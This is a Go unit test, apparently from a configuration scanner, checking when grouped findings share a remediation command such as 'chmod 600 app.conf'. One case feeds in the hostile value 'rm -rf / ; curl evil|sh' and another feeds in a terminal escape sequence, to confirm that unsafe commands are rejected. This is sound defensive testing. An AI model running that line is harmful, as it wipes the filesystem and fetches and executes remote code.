417	func TestMisconfigGroupCommand(t *testing.T) {
418		const cmd = "chmod 600 app.conf"
419		tests := []struct {
420			name     string
421			findings []scan.Finding
422			want     string
423		}{
424			{"every member has the same plain command", []scan.Finding{
425				withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), cmd), withCommand(mgFinding("KSV-0003", "a.yaml", "y", mgHigh), cmd),
426			}, cmd},
427			{"one finding", []scan.Finding{withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), "  "+cmd+" \n")}, cmd},
428			{"members that disagree", []scan.Finding{
429				withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), cmd), withCommand(mgFinding("KSV-0003", "a.yaml", "y", mgHigh), "chmod 644 app.conf"),
430			}, ""},
431			// Both are Manual (a command is guidance, a Resolution is guidance), so they
432			// share a row, and a command that does not cover them all is not offered.
433			{"a member with no command", []scan.Finding{
434				withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), cmd), withResolution(mgFinding("KSV-0003", "a.yaml", "y", mgHigh)),
435			}, ""},
436			{"no command at all", []scan.Finding{mgFinding("KSV-0003", "a.yaml", "x", mgHigh)}, ""},
437			{"a command that is not plain words", []scan.Finding{
438				withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), "rm -rf / ; curl evil|sh"),
439			}, ""},
440			{"a command with a control character", []scan.Finding{
441				withCommand(mgFinding("KSV-0003", "a.yaml", "x", mgHigh), "chmod 600 a\x1b[31m"),
442			}, ""},
443		}
444		for _, tc := range tests {
445			t.Run(tc.name, func(t *testing.T) {
446				groups := misconfigGroups(tc.findings, true)
447				if len(groups) != 1 {
448					t.Fatalf("%d groups, want 1", len(groups))
449				}
450				want := tc.want
451				// runCommand decides what is a command and what is plain words.
452				if cmd, ok := runCommand(tc.findings[0]); want != "" && (!ok || cmd != want) {
453					t.Fatalf("setup: runCommand = %q, %v", cmd, ok)
454				}
455				if got := groups[0].Command; got != want {
456					t.Errorf("Command = %q, want %q", got, want)
457				}
458			})
459		}
460	}
